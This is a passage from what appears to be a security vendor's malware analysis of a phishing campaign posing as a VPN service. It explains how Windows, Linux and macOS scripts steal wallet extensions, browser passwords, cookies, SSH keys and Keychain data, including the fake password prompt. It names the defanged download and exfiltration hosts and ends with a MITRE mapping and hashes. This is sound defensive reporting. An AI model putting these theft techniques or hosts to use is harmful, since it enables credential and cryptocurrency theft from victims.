<li>Verify if Python is installed silently using the command “<em>python --version &gt;nul 2&gt;&amp;1</em>”. If Python is not installed, download and extract the “<em>python-3.11.3-embed-amd64.zip</em>” from python.org.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Check if “<em>pip</em>” is installed. If not, download and install it using the ‘get-pip.py’ script from “<em>https://bootstrap.pypa.io/get-pip.py</em>”&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Determine if “<em>virtualenv”</em> is installed. If missing, install “<em>virtualenv” </em>using<em> </em>pip.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Create a virtual environment and activate it using “<em>call venv\Scripts\activate”</em>.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Download and install the “<em>hclockify-win</em>” package from “<em>hxxps://ganache.live/media/attachments/hclockify-win.zip</em>”, which masquerades as a legitimate Python “<em>clockify</em>” module&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use “<em>pip</em>” to install all necessary dependencies for “<em>hclockify-win</em>”.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Run the “<em>main.py</em>” script from the “<em>hclockify-win</em>” package.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use a “<em>goto</em>” statement to invoke a lure function that installs the legitimate Cloudflare application, thereby disguising the malicious intent.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>The below figure shows the content of the <em>install.bat.</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56942,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Content of Install.bat " class="wp-image-56942" src="https://cyble.com/wp-content/uploads/2024/08/Figure-9-–-Content-of-Install.bat_.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>9</em><em> – Content of Install.bat</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The malicious python package “<em>hclockify-win</em>” contains scripts to orchestrate sensitive information collection and exfiltration by calling various modules. These modules target cryptocurrency browser extensions, Crypto Wallets, and Stored Browser passwords.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Targeting Browser Extensions</strong>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The Python package "<em>hclockify-win</em>" includes a module named "<em>ganache.helperwd</em>" that scans multiple Chromium-based browsers, including Chrome, Brave, Opera, and Microsoft Edge, for cryptocurrency wallet extensions such as Trust Wallet, TronLink, Coinbase, Exodus, Crypto.com, Nami, and Solana. Once these extensions are detected, the module compresses their folders into a zip file and sends the data to the TAs command and control (C&amp;C) server through a POST request, as illustrated in the figure below.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56943,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Browser Extension " class="wp-image-56943" src="https://cyble.com/wp-content/uploads/2024/08/Figure-10-–-Targets-Browser-Extension.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>10</em><em> - Targets Browser Extension</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>By targeting these extensions, the TAs aim to steal cryptocurrency wallet data, including private keys, recovery phrases, and transaction details. This could potentially allow the TAs to gain unauthorized access to the victim's digital assets. The stolen information can be further exploited or sold on cybercrime forums.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>After scanning multiple browsers for cryptocurrency wallet extensions, the module proceeds to search through all Firefox profiles. It targets the <em>prefs.js</em> file to identify the unique ID linked to MetaMask by searching for <em>webextension@metamask.io</em>. Once the unique ID is identified, the module uses it to locate MetaMask’s backend data file present in the location “<em>b0kwoimz.default-release\storage\default\moz-extension+++7f784e52-eabb-4316-8e36-850ac47f0760^userContextId=4294967295”.</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The script then compresses this data into a zip file and transmits it to the TAs server via a POST request, maintaining the continuity of the data exfiltration process.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56944,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Firefox's MetaMask extension " class="wp-image-56944" src="https://cyble.com/wp-content/uploads/2024/08/Figure-11-–-Targets-Firefoxs-MetaMask-extension.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>11</em><em> – Targets Firefox's MetaMask extension</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting Crypto Wallets</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The malicious Python module then searches for cryptocurrency wallets installed on the system, identifying the installation directories for well-known crypto wallets such as Bitcoin, Monero, and Dashcore. After locating these directories, the content of these wallets is compressed into a zip file and subsequently uploaded to the TAs command and control (C&amp;C) server through a POST request, as shown in the figure below.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56946,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Crypto Wallets   " class="wp-image-56946" src="https://cyble.com/wp-content/uploads/2024/08/Figure-12-–-Targets-Crypto-Wallets.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>12</em><em> – Targets Crypto Wallets&nbsp;&nbsp;</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting Browser passwords</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, the malicious Python module targets browser passwords stored in an SQLite database called "<em>Login Data." </em>For Chromium-based browsers, the script first enumerates and retrieves the names of all files within the “<em>Browser-name\User Data\</em>” directory. It specifically looks for the "<em>Local State</em>" file, which holds the encrypted key necessary for decryption. The script then utilizes the “<em>CryptUnprotectData()”&nbsp;</em> function to decrypt this key. With the decrypted key, the script can subsequently decrypt the "Login Data" file, which contains all user credentials. This process allows the attackers to access and exfiltrate saved passwords from the targeted browsers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56947,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Browsers Password " class="wp-image-56947" src="https://cyble.com/wp-content/uploads/2024/08/Figure-13-Targets-Browsers-Password.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>13</em><em> - Targets Browsers Password</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>For non-Chromium-based browsers like Firefox, the TA employs a module called “<em>ganache.fflg</em>” which is capable of extracting credentials across different platforms, including Windows, Linux, and Mac. In our scenario, the focus is on Windows. The module systematically iterates through all Firefox profiles to collect key files such as “<em>prefs.js</em>”,<em> “logins.json”</em>, and, as a fallback for older versions, “<em>signons.sqlite</em>”. It then leverages the <em>Network Security Services</em> (NSS) library <em>nss3.dll</em> to decrypt and extract the browser credentials in plain text. Once decrypted, the decrypted credentials are exfiltrated from the victim's machine to the TAs command and control (C&amp;C) server.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56948,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targeting Firefox browser " class="wp-image-56948" src="https://cyble.com/wp-content/uploads/2024/08/Figure-14-Targeting-Firefox-browser.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>14</em><em> - Targeting Firefox browser</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56950,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="nss utility for credential decryption " class="wp-image-56950" src="https://cyble.com/wp-content/uploads/2024/08/Figure-15-nss-utility-for-credential-decryption.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>15</em><em> - nss utility for credential decryption</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Ubuntu/Linux</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For Linux, the TA crafted a curl command to download the "install-linux.sh" script from 'hxxps://warpvpn.net' as shown in the below figure.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56951,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt=" Installation instruction for Linux " class="wp-image-56951" src="https://cyble.com/wp-content/uploads/2024/08/Figure-16-–-Installation-instruction-for-Linux.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>16</em><em> – Installation instruction for Linux</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The script “<em>install-linux.sh</em>” first attempts to retrieve a unique ID from the &nbsp;<br />“<em>warpvpn</em>” configuration file located at “~/HOME/.config/warpvpn”. If this file is missing, the script sends a POST request to the server containing the victim’s username, operating system, and the phishing source in order to obtain a unique ID. This ID is then used in all subsequent POST requests, along with the stolen data from the victim's machine.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56952,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Unique ID " class="wp-image-56952" src="https://cyble.com/wp-content/uploads/2024/08/Figure-17-Unique-ID.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>17</em><em> - Unique ID</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The “<em>install-linux.sh” </em>script is divided into two main components: a stealer that gathers sensitive browser information and a cryptocurrency stealer, along with a function designed to mimic the legitimate Cloudflare Warp application installer.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This Linux module mirrors the Python-based stealing activities observed on Windows systems, targeting browser extensions and cryptocurrency wallets, including Bitcoin and Monero. However, on Linux, the script introduces some notable variations. The bash script is designed to steal Login Data and Cookies files from the victim’s machine and exfiltrate them to C&amp;C server. Furthermore, the script searches for and uploads SSH keys from the “<em>/.ssh</em>” folder, as depicted in the figure below. This comprehensive approach significantly boosts the attacker's ability to gain and maintain unauthorized access to the compromised system.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56953,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="content of install-linux.sh " class="wp-image-56953" src="https://cyble.com/wp-content/uploads/2024/08/Figure-18-–-content-of-install-linux.sh_.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>18</em><em> – content of install-linux.sh</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>MacOS</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For MacOS, the TA provides similar curl command to download “<em>install.sh</em>” and using default shell “<em>sh</em>” to execute the downloaded script.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56955,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Install instruction for MacOS " class="wp-image-56955" src="https://cyble.com/wp-content/uploads/2024/08/Figure-19-Install-instruction-for-MacOS.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>19</em><em> - Install instruction for MacOS</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting MacOS password:</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The script tricks the user into entering their credentials by mimicking a standard system prompt that typically appears during a new application installation, making it appear as a legitimate request. After the user enters their password, the script uses the ‘<em>dscl . -authonly</em>’ command to validate the credentials. If the validation is successful and no errors occur, the credentials, along with data from the “<em>/Library/Keychains</em>” folder, are sent to the attacker's command and control (C&amp;C) server through a ‘curl’ POST request. If the validation fails, the script repeatedly prompts the user to re-enter their credentials, continuing this process until it succeeds.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56956,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="MacOS password exfiltration " class="wp-image-56956" src="https://cyble.com/wp-content/uploads/2024/08/Figure-20-MacOS-password-exfiltration.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>20</em><em> - MacOS password exfiltration</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The TA aimed to gather information similar to what was observed in previous Linux cases. However, there are notable differences in the scope of the attack. In addition to targeting common cryptocurrency wallets like Bitcoin and Monero, the TA also focuses on a broader range of crypto wallets, including Electrum, Exodus, DashCore, and Guarda. Furthermore, the script searches for and exfiltrates saved SSH keys from the `/.ssh` folder.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56957,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt=" install.sh (Crypto wallet exfiltration) " class="wp-image-56957" src="https://cyble.com/wp-content/uploads/2024/08/Figure-21-–-install.sh-Crypto-wallet-exfiltration.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>21</em><em> – install.sh (Crypto wallet exfiltration)</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Fake Message and WarpVPN Installation</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>During the theft operation, the TA employs a deceptive tactic by displaying a fake “in-progress” message.After successfully exfiltrating the data, the script proceeds to download and install the genuine Cloudflare Warp application on the victim's machine, as shown in the figure below.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56960,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Fake Message and Legitimate VPN Installation " class="wp-image-56960" src="https://cyble.com/wp-content/uploads/2024/08/Figure-22-–-Fake-Message-and-Legitimate-VPN-Installation-1.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>22</em><em> – Fake Message and Legitimate VPN Installation</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Exfiltration over HTTPS&nbsp;</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Before the exfiltration process, the TA archives the stolen files into ZIP files, ensuring they are organized by data type with distinct archive names for each category. These archives are then transmitted to the attacker's Command and Control (C&amp;C) server via a POST request to “<em>hxxps://ganache.live/api/v1/attachment</em>”. The communication occurs over port 443, allowing the data to be sent securely under the guise of legitimate HTTPS traffic.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56961,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Exfiltration over HTTPS " class="wp-image-56961" src="https://cyble.com/wp-content/uploads/2024/08/Figure-23-Exfiltration-over-HTTPS.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>23</em><em> - Exfiltration over HTTPS</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The TA utilizes a Django Rest Framework-based interface to manage and view the exfiltrated data. This setup provides them with a structured and accessible way to organize and analyze the stolen information, ensuring efficient exploitation of the compromised data.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56962,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="attacker's login" class="wp-image-56962" src="https://cyble.com/wp-content/uploads/2024/08/Figure-24-attackers-login.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>24</em><em> - attacker's login</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>This phishing campaign masquerades as a trustworthy VPN provider. This campaign is spreading from a Telegram channel, carefully cultivating user confidence over time before pivoting to malicious objectives. This Telegram channel boasts over 54,000 subscribers, which has been operational since 2018 and is believed to have undergone a change in operators in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The campaign’s reach is underscored by its targeting of multiple platforms—Windows, Linux, and macOS—demonstrating a comprehensive approach to malware distribution. By creating distinct malicious scripts tailored for each operating system, the attackers ensure that their payloads are effectively executed across different environments. This multi-platform strategy allows the phishing operation to maximize its reach and impact, compromising a wide array of systems and harvesting sensitive information from a diverse user base.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The initial infiltration is taking place via phishing websites. It is crucial to only download and install software applications from well-known and trusted sources.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Conduct awareness campaigns to educate users about the risks of <a href="https://cyble.com/blog/phishing-attack-trends-captured-by-cyble-honeypots/">phishing attacks</a> and the importance of verifying the authenticity of VPN services. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Deploy advanced endpoint protection solutions that can detect and block malicious scripts and payloads across different operating systems. Ensure that these solutions are updated regularly to identify and mitigate new threats.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use network security tools to monitor and block communications with known Command and Control (C&amp;C) servers. Implement <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls</a> and intrusion detection systems to detect and prevent unauthorized access.  </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Enable MFA on all accounts to add an extra layer of security and reduce the risk of unauthorized access even if credentials are compromised.&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Develop and maintain an <a href="https://cyble.com/knowledge-hub/what-is-incident-response/">incident response plan</a> to quickly address and mitigate the impact of malware infections. Regularly test and update the plan to ensure effectiveness.  </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">MITRE ATT&amp;CK® Techniques&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Tactic</strong>&nbsp;</td>
<td><strong>Technique</strong>&nbsp;</td>
<td><strong>Procedure</strong>&nbsp;</td>
</tr>
<tr>
<td><strong>Initial Access (</strong><a href="https://attack.mitre.org/tactics/TA0001/" rel="noreferrer noopener" target="_blank"><strong>TA0001</strong></a><strong>)</strong>&nbsp;</td>
<td>Phishing (<a href="https://attack.mitre.org/techniques/T1566/" rel="noreferrer noopener" target="_blank">T1566</a>)&nbsp;</td>
<td>This malware reaches users via VPN phishing sites.&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>Windows&nbsp;<br />Command Shell&nbsp;<br />(<a href="https://attack.mitre.org/techniques/T1059/003/" rel="noreferrer noopener" target="_blank">T1059.003</a>)&nbsp;</td>
<td>cmd.exe is used to run commands&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>PowerShell&nbsp;(<a href="https://attack.mitre.org/techniques/T1059/001/" rel="noreferrer noopener" target="_blank">T1059.001</a>)&nbsp;</td>
<td>Invoke-WebRequest is used for downloading batch files&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>Python (<a href="https://attack.mitre.org/techniques/T1059/006/" rel="noreferrer noopener" target="_blank">T1059.006</a>)&nbsp;&nbsp;</td>
<td>Python stealer is used for targeting windows users&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>User Execution (<a href="https://attack.mitre.org/techniques/T1204/" rel="noreferrer noopener" target="_blank">T1204</a>)&nbsp;</td>
<td>User is instructed to execute the commands&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Credentials from Password Stores: Credentials from Web Browsers (<a href="https://attack.mitre.org/techniques/T1555/003/" rel="noreferrer noopener" target="_blank">T1555.003</a>)&nbsp;</td>
<td>Retrieves passwords from Login Data&nbsp;&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Credentials from Password Stores: Keychain&nbsp;(<a href="https://attack.mitre.org/techniques/T1555/001/" rel="noreferrer noopener" target="_blank">T1555.001</a>)&nbsp;</td>
<td>Attempts to exfiltrate &nbsp;<br />Keychains from MacOS system&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Steal Web Session Cookie&nbsp;(<a href="https://attack.mitre.org/techniques/T1539/" rel="noreferrer noopener" target="_blank">T1539</a>)&nbsp;</td>
<td>Steals browser cookies&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>), Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Input Capture: GUI Input Capture (<a href="https://attack.mitre.org/techniques/T1056/002/" rel="noreferrer noopener" target="_blank">T1056.002</a>)&nbsp;&nbsp;</td>
<td>Shows command window to enter password on MacOS&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Unsecured Credentials: Private Keys&nbsp;(<a href="https://attack.mitre.org/techniques/T1552/004/" rel="noreferrer noopener" target="_blank">T1552.004</a>)&nbsp;</td>
<td>Tried to exfiltrate ssh keys&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>)</strong>&nbsp;</td>
<td>Archive via Utility&nbsp;(<a href="https://attack.mitre.org/techniques/T1560/001/" rel="noreferrer noopener" target="_blank">T1560.001</a>)&nbsp;</td>
<td>Zip utility is used to compress the data before exfiltration&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>)</strong>&nbsp;</td>
<td>Archive via Library (<a href="https://attack.mitre.org/techniques/T1560/002/" rel="noreferrer noopener" target="_blank">T1560.002</a>)&nbsp;&nbsp;</td>
<td>Zip library is used to compress the data before exfiltration&nbsp;</td>
</tr>
<tr>
<td><strong>Exfiltration (</strong><a href="https://attack.mitre.org/tactics/TA0010/" rel="noreferrer noopener" target="_blank"><strong>TA0010</strong></a><strong>)</strong>&nbsp;</td>
<td>Exfiltration Over C2 Channel (<a href="https://attack.mitre.org/techniques/T1041/" rel="noreferrer noopener" target="_blank">T1041</a>)&nbsp;&nbsp;</td>
<td>Exfiltration Over C2 Channel&nbsp;&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Indicators Of Compromise&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Indicators</strong><strong> </strong>&nbsp;</td>
<td><strong>Indicator Type</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
<tr>
<td>70f08497d7a9e6a8e5f2dd3683a20563d20668e1c78df636ff1e36a014c9d493&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install-linux.sh&nbsp;</td>
</tr>
<tr>
<td>acf807def82c4b56752a9fa9b081dbb37ba9cc9f6e1c522568ff502b6b49b6db&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install.bat&nbsp;</td>
</tr>
<tr>
<td>48964c11fcbefd6508164239866c94b55ca2798e9745671c37447ad0a6f3e1c4&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install.sh&nbsp;</td>
</tr>
<tr>
<td>d3ece8616d0dd8244666af574cc2475d947180ed240f49b1a6e61443a896f65d&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>main.zip&nbsp;</td>
</tr>
<tr>
<td>3ef838502663c167f5c502585e810ffae3e03152b3f82544b813389c19a33dce&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>main.py&nbsp;</td>
</tr>
<tr>
<td>ac4aeab3952f6ca960cbd48c3123f09a68f50818f9bdf35c9d811570893fa102&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>fflg.py&nbsp;</td>
</tr>
<tr>
<td>6a68e95ae67aa8c61bd74ecf5f57f98fbdc0bbe0489ae71b7c8732edf49ac3a9&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>helperwd.py&nbsp;</td>
</tr>
<tr>
<td>c044b1a36249f6fe7219e6c48270d9927bf359110ff3583129dcbdff809f2d2d&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>utils.py&nbsp;</td>
</tr>
<tr>
